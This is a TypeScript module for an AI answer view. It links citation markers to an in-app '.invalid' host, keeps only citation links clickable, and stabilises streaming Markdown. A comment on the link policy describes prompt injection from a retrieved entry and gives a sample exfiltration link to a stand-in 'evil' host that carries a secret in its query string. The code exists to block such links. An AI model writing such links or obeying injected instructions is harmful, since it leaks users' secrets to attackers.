import type { Citation } from '@solace/shared';

/**
 * Inline citation markers. The model writes `[1]`, `[2]`… referring to `citations[].n`.
 * SafeMarkdown only renders http(s) links, so markers become links to a reserved `.invalid`
 * host (never resolvable); the answer view intercepts clicks and opens the entry in-app.
 */
export const CITE_PREFIX = 'https://solace.invalid/cite/';

const MARKER = /\[(\d{1,3})\](?!\(|:)/g;

/** Marker numbers in order of first appearance, limited to known citations. */
export function citedNumbers(content: string, citations: Citation[]): number[] {
  const known = new Set(citations.map((c) => c.n));
  const seen: number[] = [];
  for (const m of content.matchAll(MARKER)) {
    const n = Number(m[1]);
    if (known.has(n) && !seen.includes(n)) seen.push(n);
  }
  return seen;
}

/** Turn known `[n]` markers into citation links; unknown numbers and real links are left alone. */
export function linkCitations(content: string, citations: Citation[]): string {
  const known = new Set(citations.map((c) => c.n));
  if (!known.size) return content;
  // Don't touch code spans/blocks.
  return content
    .split(/(```[\s\S]*?```|`[^`\n]*`)/g)
    .map((part, i) =>
      i % 2 === 1 ? part : part.replace(MARKER, (whole, d: string) => (known.has(Number(d)) ? `[${d}](${CITE_PREFIX}${d})` : whole)),
    )
    .join('');
}

/** Citation number from a rendered marker link's href, or null. */
export function citationFromHref(href: string | null | undefined): number | null {
  if (!href || !href.startsWith(CITE_PREFIX)) return null;
  const n = Number(href.slice(CITE_PREFIX.length).replace(/\/$/, ''));
  return Number.isInteger(n) && n > 0 ? n : null;
}

/**
 * Link policy for answers: only citation markers stay clickable. Any other link the model
 * writes (possibly prompt-injected from an entry, e.g. `[here](https://evil/?q=<secret>)`)
 * renders as plain text.
 */
export function isCitationLink(href: string): boolean {
  return citationFromHref(href) !== null;
}

/**
 * Text that is safe to render as Markdown mid-stream: cut at the last word boundary and hide
 * a trailing unclosed `**`, `*`, `` ` `` or `[` so formatting doesn't flash raw → styled.
 */
export function stableStreamText(text: string, final = false): string {
  if (final) return text;
  let out = text;
  const lastSpace = Math.max(out.lastIndexOf(' '), out.lastIndexOf('\n'));
  out = lastSpace >= 0 ? out.slice(0, lastSpace + 1) : '';
  const fences = (out.match(/```/g) ?? []).length;
  if (fences % 2 === 1) out = out.slice(0, out.lastIndexOf('```'));
  const withoutFences = out.replace(/```[\s\S]*?```/g, '');
  if ((withoutFences.match(/`/g) ?? []).length % 2 === 1) out = out.slice(0, out.lastIndexOf('`'));
  if ((out.match(/\*\*/g) ?? []).length % 2 === 1) out = out.slice(0, out.lastIndexOf('**'));
  const singles = out.replace(/\*\*/g, '').match(/(^|[^*])\*(?!\*)/g) ?? [];
  if (singles.length % 2 === 1) {
    const idx = out.search(/\*(?!\*)[^*]*$/);
    if (idx >= 0) out = out.slice(0, idx);
  }
  const open = out.lastIndexOf('[');
  if (open > out.lastIndexOf(')') && open > out.lastIndexOf(']')) out = out.slice(0, open);
  return out;
}
